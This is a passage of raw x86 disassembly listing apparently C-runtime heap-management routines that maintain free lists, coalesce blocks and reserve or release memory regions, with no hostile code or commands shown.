  426735:	inc    DWORD PTR [ecx]
  426737:	mov    ecx,DWORD PTR ds:0x46308c
  42673d:	mov    ecx,DWORD PTR [ecx+0x34]
  426740:	test   ecx,ecx
  426742:	je     0x426746
  426744:	inc    DWORD PTR [ecx]
  426746:	mov    ecx,DWORD PTR ds:0x46308c
  42674c:	mov    ecx,DWORD PTR [ecx+0x30]
  42674f:	test   ecx,ecx
  426751:	je     0x426755
  426753:	inc    DWORD PTR [ecx]
  426755:	mov    ecx,DWORD PTR ds:0x46308c
  42675b:	mov    ecx,DWORD PTR [ecx+0x40]
  42675e:	test   ecx,ecx
  426760:	je     0x426764
  426762:	inc    DWORD PTR [ecx]
  426764:	mov    ecx,DWORD PTR ds:0x46308c
  42676a:	mov    ecx,DWORD PTR [ecx+0x4c]
  42676d:	inc    DWORD PTR [ecx+0xb4]
  426773:	test   eax,eax
  426775:	je     0x42678a
  426777:	cmp    DWORD PTR [eax],0x0
  42677a:	jne    0x42678a
  42677c:	cmp    eax,0x463038
  426781:	je     0x42678a
  426783:	push   eax
  426784:	call   0x426603
  426789:	pop    ecx
  42678a:	mov    eax,DWORD PTR [esi+0x64]
  42678d:	pop    esi
  42678e:	ret    
  42678f:	push   0xc
  426791:	push   0x4298b0
  426796:	call   0x425434
  42679b:	push   0xc
  42679d:	call   0x4255ef
  4267a2:	pop    ecx
  4267a3:	and    DWORD PTR [ebp-0x4],0x0
  4267a7:	call   0x4266cd
  4267ac:	mov    DWORD PTR [ebp-0x1c],eax
  4267af:	or     DWORD PTR [ebp-0x4],0xffffffff
  4267b3:	call   0x4267c1
  4267b8:	mov    eax,DWORD PTR [ebp-0x1c]
  4267bb:	call   0x42546f
  4267c0:	ret    
  4267c1:	push   0xc
  4267c3:	call   0x42555b
  4267c8:	pop    ecx
  4267c9:	ret    
  4267ca:	push   0x140
  4267cf:	push   0x0
  4267d1:	push   DWORD PTR ds:0x463c40
  4267d7:	call   DWORD PTR ds:0x429038
  4267dd:	test   eax,eax
  4267df:	mov    ds:0x463a00,eax
  4267e4:	jne    0x4267e7
  4267e6:	ret    
  4267e7:	mov    ecx,DWORD PTR [esp+0x4]
  4267eb:	and    DWORD PTR ds:0x4639f8,0x0
  4267f2:	and    DWORD PTR ds:0x4639fc,0x0
  4267f9:	mov    ds:0x463a08,eax
  4267fe:	xor    eax,eax
  426800:	mov    DWORD PTR ds:0x463a04,ecx
  426806:	mov    DWORD PTR ds:0x463a0c,0x10
  426810:	inc    eax
  426811:	ret    
  426812:	mov    eax,ds:0x4639fc
  426817:	lea    ecx,[eax+eax*4]
  42681a:	mov    eax,ds:0x463a00
  42681f:	lea    ecx,[eax+ecx*4]
  426822:	jmp    0x426836
  426824:	mov    edx,DWORD PTR [esp+0x4]
  426828:	sub    edx,DWORD PTR [eax+0xc]
  42682b:	cmp    edx,0x100000
  426831:	jb     0x42683c
  426833:	add    eax,0x14
  426836:	cmp    eax,ecx
  426838:	jb     0x426824
  42683a:	xor    eax,eax
  42683c:	ret    
  42683d:	push   ebp
  42683e:	mov    ebp,esp
  426840:	sub    esp,0x10
  426843:	mov    ecx,DWORD PTR [ebp+0x8]
  426846:	mov    eax,DWORD PTR [ecx+0x10]
  426849:	push   esi
  42684a:	mov    esi,DWORD PTR [ebp+0xc]
  42684d:	push   edi
  42684e:	mov    edi,esi
  426850:	sub    edi,DWORD PTR [ecx+0xc]
  426853:	add    esi,0xfffffffc
  426856:	shr    edi,0xf
  426859:	mov    ecx,edi
  42685b:	imul   ecx,ecx,0x204
  426861:	lea    ecx,[ecx+eax*1+0x144]
  426868:	mov    DWORD PTR [ebp-0x10],ecx
  42686b:	mov    ecx,DWORD PTR [esi]
  42686d:	dec    ecx
  42686e:	test   cl,0x1
  426871:	mov    DWORD PTR [ebp-0x4],ecx
  426874:	jne    0x426b51
  42687a:	push   ebx
  42687b:	lea    ebx,[ecx+esi*1]
  42687e:	mov    edx,DWORD PTR [ebx]
  426880:	mov    DWORD PTR [ebp-0xc],edx
  426883:	mov    edx,DWORD PTR [esi-0x4]
  426886:	mov    DWORD PTR [ebp-0x8],edx
  426889:	mov    edx,DWORD PTR [ebp-0xc]
  42688c:	test   dl,0x1
  42688f:	mov    DWORD PTR [ebp+0xc],ebx
  426892:	jne    0x426908
  426894:	sar    edx,0x4
  426897:	dec    edx
  426898:	cmp    edx,0x3f
  42689b:	jbe    0x4268a0
  42689d:	push   0x3f
  42689f:	pop    edx
  4268a0:	mov    ecx,DWORD PTR [ebx+0x4]
  4268a3:	cmp    ecx,DWORD PTR [ebx+0x8]
  4268a6:	jne    0x4268ea
  4268a8:	cmp    edx,0x20
  4268ab:	mov    ebx,0x80000000
  4268b0:	jae    0x4268cb
  4268b2:	mov    ecx,edx
  4268b4:	shr    ebx,cl
  4268b6:	lea    ecx,[edx+eax*1+0x4]
  4268ba:	not    ebx
  4268bc:	and    DWORD PTR [eax+edi*4+0x44],ebx
  4268c0:	dec    BYTE PTR [ecx]
  4268c2:	jne    0x4268e7
  4268c4:	mov    ecx,DWORD PTR [ebp+0x8]
  4268c7:	and    DWORD PTR [ecx],ebx
  4268c9:	jmp    0x4268e7
  4268cb:	lea    ecx,[edx-0x20]
  4268ce:	shr    ebx,cl
  4268d0:	lea    ecx,[edx+eax*1+0x4]
  4268d4:	not    ebx
  4268d6:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  4268dd:	dec    BYTE PTR [ecx]
  4268df:	jne    0x4268e7
  4268e1:	mov    ecx,DWORD PTR [ebp+0x8]
  4268e4:	and    DWORD PTR [ecx+0x4],ebx
  4268e7:	mov    ebx,DWORD PTR [ebp+0xc]
  4268ea:	mov    edx,DWORD PTR [ebx+0x8]
  4268ed:	mov    ebx,DWORD PTR [ebx+0x4]
  4268f0:	mov    ecx,DWORD PTR [ebp-0x4]
  4268f3:	add    ecx,DWORD PTR [ebp-0xc]
  4268f6:	mov    DWORD PTR [edx+0x4],ebx
  4268f9:	mov    edx,DWORD PTR [ebp+0xc]
  4268fc:	mov    ebx,DWORD PTR [edx+0x4]
  4268ff:	mov    edx,DWORD PTR [edx+0x8]
  426902:	mov    DWORD PTR [ebx+0x8],edx
  426905:	mov    DWORD PTR [ebp-0x4],ecx
  426908:	mov    edx,ecx
  42690a:	sar    edx,0x4
  42690d:	dec    edx
  42690e:	cmp    edx,0x3f
  426911:	jbe    0x426916
  426913:	push   0x3f
  426915:	pop    edx
  426916:	mov    ebx,DWORD PTR [ebp-0x8]
  426919:	and    ebx,0x1
  42691c:	mov    DWORD PTR [ebp-0xc],ebx
  42691f:	jne    0x4269b4
  426925:	sub    esi,DWORD PTR [ebp-0x8]
  426928:	mov    ebx,DWORD PTR [ebp-0x8]
  42692b:	sar    ebx,0x4
  42692e:	push   0x3f
  426930:	mov    DWORD PTR [ebp+0xc],esi
  426933:	dec    ebx
  426934:	pop    esi
  426935:	cmp    ebx,esi
  426937:	jbe    0x42693b
  426939:	mov    ebx,esi
  42693b:	add    ecx,DWORD PTR [ebp-0x8]
  42693e:	mov    edx,ecx
  426940:	sar    edx,0x4
  426943:	dec    edx
  426944:	cmp    edx,esi
  426946:	mov    DWORD PTR [ebp-0x4],ecx
  426949:	jbe    0x42694d
  42694b:	mov    edx,esi
  42694d:	cmp    ebx,edx
  42694f:	je     0x4269af
  426951:	mov    ecx,DWORD PTR [ebp+0xc]
  426954:	mov    esi,DWORD PTR [ecx+0x4]
  426957:	cmp    esi,DWORD PTR [ecx+0x8]
  42695a:	jne    0x426997
  42695c:	cmp    ebx,0x20
  42695f:	mov    esi,0x80000000
  426964:	jae    0x42697d
  426966:	mov    ecx,ebx
  426968:	shr    esi,cl
  42696a:	not    esi
  42696c:	and    DWORD PTR [eax+edi*4+0x44],esi
  426970:	dec    BYTE PTR [ebx+eax*1+0x4]
  426974:	jne    0x426997
  426976:	mov    ecx,DWORD PTR [ebp+0x8]
  426979:	and    DWORD PTR [ecx],esi
  42697b:	jmp    0x426997
  42697d:	lea    ecx,[ebx-0x20]
  426980:	shr    esi,cl
  426982:	not    esi
  426984:	and    DWORD PTR [eax+edi*4+0xc4],esi
  42698b:	dec    BYTE PTR [ebx+eax*1+0x4]
  42698f:	jne    0x426997
  426991:	mov    ecx,DWORD PTR [ebp+0x8]
  426994:	and    DWORD PTR [ecx+0x4],esi
  426997:	mov    ecx,DWORD PTR [ebp+0xc]
  42699a:	mov    esi,DWORD PTR [ecx+0x8]
  42699d:	mov    ecx,DWORD PTR [ecx+0x4]
  4269a0:	mov    DWORD PTR [esi+0x4],ecx
  4269a3:	mov    ecx,DWORD PTR [ebp+0xc]
  4269a6:	mov    esi,DWORD PTR [ecx+0x4]
  4269a9:	mov    ecx,DWORD PTR [ecx+0x8]
  4269ac:	mov    DWORD PTR [esi+0x8],ecx
  4269af:	mov    esi,DWORD PTR [ebp+0xc]
  4269b2:	jmp    0x4269b7
  4269b4:	mov    ebx,DWORD PTR [ebp+0x8]
  4269b7:	cmp    DWORD PTR [ebp-0xc],0x0
  4269bb:	jne    0x4269c5
  4269bd:	cmp    ebx,edx
  4269bf:	je     0x426a45
  4269c5:	mov    ecx,DWORD PTR [ebp-0x10]
  4269c8:	lea    ecx,[ecx+edx*8]
  4269cb:	mov    ebx,DWORD PTR [ecx+0x4]
  4269ce:	mov    DWORD PTR [esi+0x8],ecx
  4269d1:	mov    DWORD PTR [esi+0x4],ebx
  4269d4:	mov    DWORD PTR [ecx+0x4],esi
  4269d7:	mov    ecx,DWORD PTR [esi+0x4]
  4269da:	mov    DWORD PTR [ecx+0x8],esi
  4269dd:	mov    ecx,DWORD PTR [esi+0x4]
  4269e0:	cmp    ecx,DWORD PTR [esi+0x8]
  4269e3:	jne    0x426a45
  4269e5:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  4269e9:	mov    BYTE PTR [ebp+0xf],cl
  4269ec:	inc    cl
  4269ee:	cmp    edx,0x20
  4269f1:	mov    BYTE PTR [edx+eax*1+0x4],cl
  4269f5:	jae    0x426a1c
  4269f7:	cmp    BYTE PTR [ebp+0xf],0x0
  4269fb:	jne    0x426a0b
  4269fd:	mov    ecx,edx
  4269ff:	mov    ebx,0x80000000
  426a04:	shr    ebx,cl
  426a06:	mov    ecx,DWORD PTR [ebp+0x8]
  426a09:	or     DWORD PTR [ecx],ebx
  426a0b:	mov    ebx,0x80000000
  426a10:	mov    ecx,edx
  426a12:	shr    ebx,cl
  426a14:	lea    eax,[eax+edi*4+0x44]
  426a18:	or     DWORD PTR [eax],ebx
  426a1a:	jmp    0x426a45
  426a1c:	cmp    BYTE PTR [ebp+0xf],0x0
  426a20:	jne    0x426a32
  426a22:	lea    ecx,[edx-0x20]
  426a25:	mov    ebx,0x80000000
  426a2a:	shr    ebx,cl
  426a2c:	mov    ecx,DWORD PTR [ebp+0x8]
  426a2f:	or     DWORD PTR [ecx+0x4],ebx
  426a32:	lea    ecx,[edx-0x20]
  426a35:	mov    edx,0x80000000
  426a3a:	shr    edx,cl
  426a3c:	lea    eax,[eax+edi*4+0xc4]
  426a43:	or     DWORD PTR [eax],edx
  426a45:	mov    eax,DWORD PTR [ebp-0x4]
  426a48:	mov    DWORD PTR [esi],eax
  426a4a:	mov    DWORD PTR [eax+esi*1-0x4],eax
  426a4e:	mov    eax,DWORD PTR [ebp-0x10]
  426a51:	dec    DWORD PTR [eax]
  426a53:	jne    0x426b50
  426a59:	mov    eax,ds:0x4639f8
  426a5e:	test   eax,eax
  426a60:	je     0x426b42
  426a66:	mov    ecx,DWORD PTR ds:0x463a10
  426a6c:	mov    esi,DWORD PTR ds:0x4290ec
  426a72:	push   0x4000
  426a77:	shl    ecx,0xf
  426a7a:	add    ecx,DWORD PTR [eax+0xc]
  426a7d:	mov    ebx,0x8000
  426a82:	push   ebx
  426a83:	push   ecx
  426a84:	call   esi
  426a86:	mov    ecx,DWORD PTR ds:0x463a10
  426a8c:	mov    eax,ds:0x4639f8
  426a91:	mov    edx,0x80000000
  426a96:	shr    edx,cl
  426a98:	or     DWORD PTR [eax+0x8],edx
  426a9b:	mov    eax,ds:0x4639f8
  426aa0:	mov    eax,DWORD PTR [eax+0x10]
  426aa3:	mov    ecx,DWORD PTR ds:0x463a10
  426aa9:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  426ab1:	mov    eax,ds:0x4639f8
  426ab6:	mov    eax,DWORD PTR [eax+0x10]
  426ab9:	dec    BYTE PTR [eax+0x43]
  426abc:	mov    eax,ds:0x4639f8
  426ac1:	mov    ecx,DWORD PTR [eax+0x10]
  426ac4:	cmp    BYTE PTR [ecx+0x43],0x0
  426ac8:	jne    0x426ad3
  426aca:	and    DWORD PTR [eax+0x4],0xfffffffe
  426ace:	mov    eax,ds:0x4639f8
  426ad3:	cmp    DWORD PTR [eax+0x8],0xffffffff
  426ad7:	jne    0x426b42
  426ad9:	push   ebx
  426ada:	push   0x0
  426adc:	push   DWORD PTR [eax+0xc]
  426adf:	call   esi
  426ae1:	mov    eax,ds:0x4639f8
  426ae6:	push   DWORD PTR [eax+0x10]
  426ae9:	push   0x0
  426aeb:	push   DWORD PTR ds:0x463c40
  426af1:	call   DWORD PTR ds:0x429034
  426af7:	mov    eax,ds:0x4639fc
  426afc:	mov    edx,DWORD PTR ds:0x463a00
  426b02:	lea    eax,[eax+eax*4]
  426b05:	shl    eax,0x2
  426b08:	mov    ecx,eax
  426b0a:	mov    eax,ds:0x4639f8
  426b0f:	sub    ecx,eax
  426b11:	lea    ecx,[ecx+edx*1-0x14]
  426b15:	push   ecx
  426b16:	lea    ecx,[eax+0x14]
  426b19:	push   ecx
  426b1a:	push   eax
  426b1b:	call   0x428370
  426b20:	mov    eax,DWORD PTR [ebp+0x8]
  426b23:	add    esp,0xc
  426b26:	dec    DWORD PTR ds:0x4639fc
  426b2c:	cmp    eax,DWORD PTR ds:0x4639f8
  426b32:	jbe    0x426b38
  426b34:	sub    DWORD PTR [ebp+0x8],0x14
  426b38:	mov    eax,ds:0x463a00
  426b3d:	mov    ds:0x463a08,eax
  426b42:	mov    eax,DWORD PTR [ebp+0x8]
  426b45:	mov    ds:0x4639f8,eax
  426b4a:	mov    DWORD PTR ds:0x463a10,edi
  426b50:	pop    ebx
  426b51:	pop    edi
  426b52:	pop    esi
  426b53:	leave  
  426b54:	ret    
  426b55:	mov    eax,ds:0x4639fc
  426b5a:	mov    ecx,DWORD PTR ds:0x463a0c
  426b60:	push   edi
  426b61:	xor    edi,edi
  426b63:	cmp    eax,ecx
  426b65:	jne    0x426b9b
  426b67:	lea    eax,[ecx+ecx*4+0x50]
  426b6b:	shl    eax,0x2
  426b6e:	push   eax
  426b6f:	push   DWORD PTR ds:0x463a00
  426b75:	push   edi
  426b76:	push   DWORD PTR ds:0x463c40
  426b7c:	call   DWORD PTR ds:0x42910c
  426b82:	cmp    eax,edi
  426b84:	jne    0x426b8a
  426b86:	xor    eax,eax
  426b88:	pop    edi
  426b89:	ret    
  426b8a:	add    DWORD PTR ds:0x463a0c,0x10
  426b91:	mov    ds:0x463a00,eax
  426b96:	mov    eax,ds:0x4639fc
  426b9b:	mov    ecx,DWORD PTR ds:0x463a00
  426ba1:	push   esi
  426ba2:	push   0x41c4
  426ba7:	push   0x8
  426ba9:	push   DWORD PTR ds:0x463c40
  426baf:	lea    eax,[eax+eax*4]
  426bb2:	lea    esi,[ecx+eax*4]
  426bb5:	call   DWORD PTR ds:0x429038
  426bbb:	cmp    eax,edi
  426bbd:	mov    DWORD PTR [esi+0x10],eax
  426bc0:	jne    0x426bc6
  426bc2:	xor    eax,eax
  426bc4:	jmp    0x426c09
  426bc6:	push   0x4
  426bc8:	push   0x2000
  426bcd:	push   0x100000
  426bd2:	push   edi
  426bd3:	call   DWORD PTR ds:0x429058
  426bd9:	cmp    eax,edi
  426bdb:	mov    DWORD PTR [esi+0xc],eax
  426bde:	jne    0x426bf2
  426be0:	push   DWORD PTR [esi+0x10]
  426be3:	push   edi
  426be4:	push   DWORD PTR ds:0x463c40
  426bea:	call   DWORD PTR ds:0x429034
  426bf0:	jmp    0x426bc2
  426bf2:	or     DWORD PTR [esi+0x8],0xffffffff
  426bf6:	mov    DWORD PTR [esi],edi
  426bf8:	mov    DWORD PTR [esi+0x4],edi
  426bfb:	inc    DWORD PTR ds:0x4639fc
  426c01:	mov    eax,DWORD PTR [esi+0x10]
  426c04:	or     DWORD PTR [eax],0xffffffff
  426c07:	mov    eax,esi
  426c09:	pop    esi
  426c0a:	pop    edi
  426c0b:	ret    
  426c0c:	push   ebp
  426c0d:	mov    ebp,esp
  426c0f:	push   ecx
  426c10:	push   ecx
  426c11:	mov    ecx,DWORD PTR [ebp+0x8]
  426c14:	mov    eax,DWORD PTR [ecx+0x8]
  426c17:	push   ebx
  426c18:	push   esi
  426c19:	mov    esi,DWORD PTR [ecx+0x10]
  426c1c:	push   edi
  426c1d:	xor    ebx,ebx
  426c1f:	jmp    0x426c24
  426c21:	shl    eax,1
  426c23:	inc    ebx
  426c24:	test   eax,eax
  426c26:	jge    0x426c21
  426c28:	mov    eax,ebx
  426c2a:	imul   eax,eax,0x204
  426c30:	lea    eax,[eax+esi*1+0x144]
  426c37:	push   0x3f
  426c39:	mov    DWORD PTR [ebp-0x8],eax
  426c3c:	pop    edx
  426c3d:	mov    DWORD PTR [eax+0x8],eax
  426c40:	mov    DWORD PTR [eax+0x4],eax
  426c43:	add    eax,0x8
  426c46:	dec    edx
  426c47:	jne    0x426c3d
  426c49:	push   0x4
  426c4b:	mov    edi,ebx
  426c4d:	push   0x1000
  426c52:	shl    edi,0xf
  426c55:	add    edi,DWORD PTR [ecx+0xc]
  426c58:	push   0x8000
  426c5d:	push   edi
  426c5e:	call   DWORD PTR ds:0x429058
  426c64:	test   eax,eax
  426c66:	jne    0x426c70
  426c68:	or     eax,0xffffffff
  426c6b:	jmp    0x426d0d
  426c70:	lea    edx,[edi+0x7000]
  426c76:	cmp    edi,edx
  426c78:	mov    DWORD PTR [ebp-0x4],edx
  426c7b:	ja     0x426cc0
  426c7d:	mov    ecx,edx
  426c7f:	sub    ecx,edi
  426c81:	shr    ecx,0xc
  426c84:	lea    eax,[edi+0x10]
  426c87:	inc    ecx
  426c88:	or     DWORD PTR [eax-0x8],0xffffffff
  426c8c:	or     DWORD PTR [eax+0xfec],0xffffffff
  426c93:	lea    edx,[eax+0xffc]
  426c99:	mov    DWORD PTR [eax],edx
  426c9b:	lea    edx,[eax-0x1004]
  426ca1:	mov    DWORD PTR [eax-0x4],0xff0
  426ca8:	mov    DWORD PTR [eax+0x4],edx
  426cab:	mov    DWORD PTR [eax+0xfe8],0xff0
  426cb5:	add    eax,0x1000
  426cba:	dec    ecx
  426cbb:	jne    0x426c88
  426cbd:	mov    edx,DWORD PTR [ebp-0x4]
  426cc0:	mov    eax,DWORD PTR [ebp-0x8]
  426cc3:	add    eax,0x1f8
  426cc8:	lea    ecx,[edi+0xc]
  426ccb:	mov    DWORD PTR [eax+0x4],ecx
  426cce:	mov    DWORD PTR [ecx+0x8],eax
  426cd1:	lea    ecx,[edx+0xc]
  426cd4:	mov    DWORD PTR [eax+0x8],ecx
  426cd7:	mov    DWORD PTR [ecx+0x4],eax
  426cda:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  426cdf:	xor    edi,edi
  426ce1:	inc    edi
  426ce2:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  426ce9:	mov    al,BYTE PTR [esi+0x43]
  426cec:	mov    cl,al
  426cee:	inc    cl
  426cf0:	test   al,al
  426cf2:	mov    eax,DWORD PTR [ebp+0x8]
  426cf5:	mov    BYTE PTR [esi+0x43],cl
  426cf8:	jne    0x426cfd
  426cfa:	or     DWORD PTR [eax+0x4],edi
  426cfd:	mov    edx,0x80000000
  426d02:	mov    ecx,ebx
  426d04:	shr    edx,cl
  426d06:	not    edx
  426d08:	and    DWORD PTR [eax+0x8],edx
  426d0b:	mov    eax,ebx
  426d0d:	pop    edi
  426d0e:	pop    esi
  426d0f:	pop    ebx
  426d10:	leave  
  426d11:	ret    
  426d12:	push   ebp
  426d13:	mov    ebp,esp
  426d15:	sub    esp,0xc
  426d18:	mov    ecx,DWORD PTR [ebp+0x8]
  426d1b:	mov    eax,DWORD PTR [ecx+0x10]
  426d1e:	push   ebx
  426d1f:	push   esi
  426d20:	mov    esi,DWORD PTR [ebp+0x10]
  426d23:	push   edi
  426d24:	mov    edi,DWORD PTR [ebp+0xc]
  426d27:	mov    edx,edi
  426d29:	sub    edx,DWORD PTR [ecx+0xc]
  426d2c:	add    esi,0x17
  426d2f:	shr    edx,0xf
  426d32:	mov    ecx,edx
  426d34:	imul   ecx,ecx,0x204
  426d3a:	lea    ecx,[ecx+eax*1+0x144]
  426d41:	mov    DWORD PTR [ebp-0xc],ecx
  426d44:	mov    ecx,DWORD PTR [edi-0x4]
  426d47:	and    esi,0xfffffff0
  426d4a:	dec    ecx
  426d4b:	cmp    esi,ecx
  426d4d:	lea    edi,[ecx+edi*1-0x4]
  426d51:	mov    ebx,DWORD PTR [edi]
  426d53:	mov    DWORD PTR [ebp+0x10],ecx
  426d56:	mov    DWORD PTR [ebp-0x4],ebx
  426d59:	jle    0x426eb4
  426d5f:	test   bl,0x1
  426d62:	jne    0x426ead
  426d68:	add    ebx,ecx
  426d6a:	cmp    esi,ebx
  426d6c:	jg     0x426ead
  426d72:	mov    ecx,DWORD PTR [ebp-0x4]
  426d75:	sar    ecx,0x4
  426d78:	dec    ecx
  426d79:	cmp    ecx,0x3f
  426d7c:	mov    DWORD PTR [ebp-0x8],ecx
  426d7f:	jbe    0x426d87
  426d81:	push   0x3f
  426d83:	pop    ecx
  426d84:	mov    DWORD PTR [ebp-0x8],ecx
  426d87:	mov    ebx,DWORD PTR [edi+0x4]
  426d8a:	cmp    ebx,DWORD PTR [edi+0x8]
  426d8d:	jne    0x426dd2
  426d8f:	cmp    ecx,0x20
  426d92:	mov    ebx,0x80000000
  426d97:	jae    0x426db3
  426d99:	shr    ebx,cl
  426d9b:	mov    ecx,DWORD PTR [ebp-0x8]
  426d9e:	lea    ecx,[ecx+eax*1+0x4]
  426da2:	not    ebx
  426da4:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426da8:	dec    BYTE PTR [ecx]
  426daa:	jne    0x426dd2
  426dac:	mov    ecx,DWORD PTR [ebp+0x8]
  426daf:	and    DWORD PTR [ecx],ebx
  426db1:	jmp    0x426dd2
  426db3:	add    ecx,0xffffffe0
  426db6:	shr    ebx,cl
  426db8:	mov    ecx,DWORD PTR [ebp-0x8]
  426dbb:	lea    ecx,[ecx+eax*1+0x4]
  426dbf:	not    ebx
  426dc1:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426dc8:	dec    BYTE PTR [ecx]
  426dca:	jne    0x426dd2
  426dcc:	mov    ecx,DWORD PTR [ebp+0x8]
  426dcf:	and    DWORD PTR [ecx+0x4],ebx
  426dd2:	mov    ecx,DWORD PTR [edi+0x8]
  426dd5:	mov    ebx,DWORD PTR [edi+0x4]
  426dd8:	mov    DWORD PTR [ecx+0x4],ebx
  426ddb:	mov    ecx,DWORD PTR [edi+0x4]
  426dde:	mov    edi,DWORD PTR [edi+0x8]
  426de1:	mov    DWORD PTR [ecx+0x8],edi
  426de4:	mov    ecx,DWORD PTR [ebp+0x10]
  426de7:	sub    ecx,esi
  426de9:	add    DWORD PTR [ebp-0x4],ecx
  426dec:	cmp    DWORD PTR [ebp-0x4],0x0
  426df0:	jle    0x426e9b
  426df6:	mov    edi,DWORD PTR [ebp-0x4]
  426df9:	mov    ecx,DWORD PTR [ebp+0xc]
  426dfc:	sar    edi,0x4
  426dff:	dec    edi
  426e00:	cmp    edi,0x3f
  426e03:	lea    ecx,[ecx+esi*1-0x4]
  426e07:	jbe    0x426e0c
  426e09:	push   0x3f
  426e0b:	pop    edi
  426e0c:	mov    ebx,DWORD PTR [ebp-0xc]
  426e0f:	lea    ebx,[ebx+edi*8]
  426e12:	mov    DWORD PTR [ebp+0x10],ebx
  426e15:	mov    ebx,DWORD PTR [ebx+0x4]
  426e18:	mov    DWORD PTR [ecx+0x4],ebx
  426e1b:	mov    ebx,DWORD PTR [ebp+0x10]
  426e1e:	mov    DWORD PTR [ecx+0x8],ebx
  426e21:	mov    DWORD PTR [ebx+0x4],ecx
  426e24:	mov    ebx,DWORD PTR [ecx+0x4]
  426e27:	mov    DWORD PTR [ebx+0x8],ecx
  426e2a:	mov    ebx,DWORD PTR [ecx+0x4]
  426e2d:	cmp    ebx,DWORD PTR [ecx+0x8]
  426e30:	jne    0x426e89
  426e32:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  426e36:	mov    BYTE PTR [ebp+0x13],cl
  426e39:	inc    cl
  426e3b:	cmp    edi,0x20
  426e3e:	mov    BYTE PTR [edi+eax*1+0x4],cl
  426e42:	jae    0x426e60
  426e44:	cmp    BYTE PTR [ebp+0x13],0x0
  426e48:	jne    0x426e58
  426e4a:	mov    ecx,edi
  426e4c:	mov    ebx,0x80000000
  426e51:	shr    ebx,cl
  426e53:	mov    ecx,DWORD PTR [ebp+0x8]
  426e56:	or     DWORD PTR [ecx],ebx
  426e58:	lea    eax,[eax+edx*4+0x44]
  426e5c:	mov    ecx,edi
  426e5e:	jmp    0x426e80
  426e60:	cmp    BYTE PTR [ebp+0x13],0x0
  426e64:	jne    0x426e76
  426e66:	lea    ecx,[edi-0x20]
  426e69:	mov    ebx,0x80000000
  426e6e:	shr    ebx,cl
  426e70:	mov    ecx,DWORD PTR [ebp+0x8]
  426e73:	or     DWORD PTR [ecx+0x4],ebx
  426e76:	lea    eax,[eax+edx*4+0xc4]
  426e7d:	lea    ecx,[edi-0x20]
  426e80:	mov    edx,0x80000000
  426e85:	shr    edx,cl
  426e87:	or     DWORD PTR [eax],edx
  426e89:	mov    edx,DWORD PTR [ebp+0xc]
  426e8c:	mov    ecx,DWORD PTR [ebp-0x4]
  426e8f:	lea    eax,[edx+esi*1-0x4]
  426e93:	mov    DWORD PTR [eax],ecx
  426e95:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  426e99:	jmp    0x426e9e
  426e9b:	mov    edx,DWORD PTR [ebp+0xc]
  426e9e:	lea    eax,[esi+0x1]
  426ea1:	mov    DWORD PTR [edx-0x4],eax
  426ea4:	mov    DWORD PTR [edx+esi*1-0x8],eax
  426ea8:	jmp    0x426fe9
  426ead:	xor    eax,eax
  426eaf:	jmp    0x426fec
  426eb4:	jge    0x426fe9
  426eba:	mov    ebx,DWORD PTR [ebp+0xc]
  426ebd:	sub    DWORD PTR [ebp+0x10],esi
  426ec0:	lea    ecx,[esi+0x1]
  426ec3:	mov    DWORD PTR [ebx-0x4],ecx
  426ec6:	lea    ebx,[ebx+esi*1-0x4]
  426eca:	mov    esi,DWORD PTR [ebp+0x10]
  426ecd:	sar    esi,0x4
  426ed0:	dec    esi
  426ed1:	cmp    esi,0x3f
  426ed4:	mov    DWORD PTR [ebp+0xc],ebx
  426ed7:	mov    DWORD PTR [ebx-0x4],ecx
  426eda:	jbe    0x426edf
  426edc:	push   0x3f
  426ede:	pop    esi
  426edf:	test   BYTE PTR [ebp-0x4],0x1
  426ee3:	jne    0x426f69
  426ee9:	mov    esi,DWORD PTR [ebp-0x4]
  426eec:	sar    esi,0x4
  426eef:	dec    esi
  426ef0:	cmp    esi,0x3f
  426ef3:	jbe    0x426ef8
  426ef5:	push   0x3f
  426ef7:	pop    esi
  426ef8:	mov    ecx,DWORD PTR [edi+0x4]
  426efb:	cmp    ecx,DWORD PTR [edi+0x8]
  426efe:	jne    0x426f42
  426f00:	cmp    esi,0x20
  426f03:	mov    ebx,0x80000000
  426f08:	jae    0x426f23
  426f0a:	mov    ecx,esi
  426f0c:	shr    ebx,cl
  426f0e:	lea    esi,[esi+eax*1+0x4]
  426f12:	not    ebx
  426f14:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426f18:	dec    BYTE PTR [esi]
  426f1a:	jne    0x426f3f
  426f1c:	mov    ecx,DWORD PTR [ebp+0x8]
  426f1f:	and    DWORD PTR [ecx],ebx
  426f21:	jmp    0x426f3f
  426f23:	lea    ecx,[esi-0x20]
  426f26:	shr    ebx,cl
  426f28:	lea    ecx,[esi+eax*1+0x4]
  426f2c:	not    ebx
  426f2e:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426f35:	dec    BYTE PTR [ecx]
  426f37:	jne    0x426f3f
  426f39:	mov    ecx,DWORD PTR [ebp+0x8]
  426f3c:	and    DWORD PTR [ecx+0x4],ebx
  426f3f:	mov    ebx,DWORD PTR [ebp+0xc]
  426f42:	mov    ecx,DWORD PTR [edi+0x8]
  426f45:	mov    esi,DWORD PTR [edi+0x4]
  426f48:	mov    DWORD PTR [ecx+0x4],esi
  426f4b:	mov    esi,DWORD PTR [edi+0x8]
  426f4e:	mov    ecx,DWORD PTR [edi+0x4]
  426f51:	mov    DWORD PTR [ecx+0x8],esi
  426f54:	mov    esi,DWORD PTR [ebp+0x10]
  426f57:	add    esi,DWORD PTR [ebp-0x4]
  426f5a:	mov    DWORD PTR [ebp+0x10],esi
  426f5d:	sar    esi,0x4
  426f60:	dec    esi
  426f61:	cmp    esi,0x3f
  426f64:	jbe    0x426f69
  426f66:	push   0x3f
  426f68:	pop    esi
  426f69:	mov    ecx,DWORD PTR [ebp-0xc]
  426f6c:	lea    ecx,[ecx+esi*8]
  426f6f:	mov    edi,DWORD PTR [ecx+0x4]
  426f72:	mov    DWORD PTR [ebx+0x8],ecx
  426f75:	mov    DWORD PTR [ebx+0x4],edi
  426f78:	mov    DWORD PTR [ecx+0x4],ebx
  426f7b:	mov    ecx,DWORD PTR [ebx+0x4]
  426f7e:	mov    DWORD PTR [ecx+0x8],ebx
